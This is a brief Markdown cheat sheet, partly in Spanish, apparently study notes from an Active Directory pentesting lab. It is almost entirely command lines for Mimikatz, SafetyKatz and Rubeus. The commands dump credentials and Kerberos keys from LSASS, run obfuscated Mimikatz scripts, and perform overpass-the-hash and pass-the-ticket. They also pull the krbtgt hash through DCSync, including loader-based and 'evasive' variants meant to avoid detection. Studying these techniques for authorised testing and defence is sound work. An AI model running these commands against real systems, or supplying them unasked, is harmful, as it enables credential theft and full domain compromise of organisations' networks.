# Mimikatz 

Tags: #AD #Windows #Mimikatz #Powershell #Rubeus 

* [Mimikatz](https://gitlab.com/kalilinux/packages/mimikatz/-/tree/kali/master/x64?ref_type=heads)

```powershell 
Mimikatz puede ser usado para extraer credenciales, tickets
```

## Runas 

```powershell 
❯ runas /user:domain\user /netonly cmd       
```

## Credential Extration - LSASS

```powershell 
❯ mimikatz.exe -Command '"sekurlsa::ekeys"'    # Dump credentials on a using Mimikatz
❯ SafetyKatz.exe "sekurlsa::ekeys"             # Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)

Notes: 
	1. From a Linux attacking machine using impacket 
```

```powershell 
❯ .\Invoke-Mimi.ps1   # Script ligero 

# Versión ofuscada    
❯ .\Invoke-MimiEx-keys.ps1         # Ejecutar sekurlsa::ekeys 
❯ .\Invoke-MimiEx-vault.ps1        # Ejecutar vault::cred /patch 
```

## OverPass The Hash 

```powershell 
❯ SafetyKatz.exe "sekurlsa::pth /user:administrator /domain: dollarcorp.moneycorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"       # Over Pass The Hash (OPTH) generate tokens from hashes or keys. Needs elevation (Run as administrator)

Notes: 
	1. The above commands starts a process with a logon type 9 (same as runas /netonly) 
```

## OverPass The Hash - Rubeus 

```powershell 
❯ Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt    # Doesn't need elevation 

❯ Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt           # This command needs elevation 

❯ C:\AD\Loader.exe -path C:\AD\Rubeus.exe -args asktgt /user:svcadmin /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt 

Notes:
	1. Over Pass The Hash (OPTH) generate tokens from hashes or keys
```

## DCSync 

```powershell 
# To extract credentials from the DC without code execution on it, we can use DCSync

❯ SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"    # To use the DCSync feature for getting krbtgt hash execute. Use this command with DA privileges for domain 

❯ C:\AD\Loader.exe -path C:\AD\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit" 

Notes:
	1. By default, Domain Admins, Enterprise Admins or Domain Controller privileges are required to run DCSync
```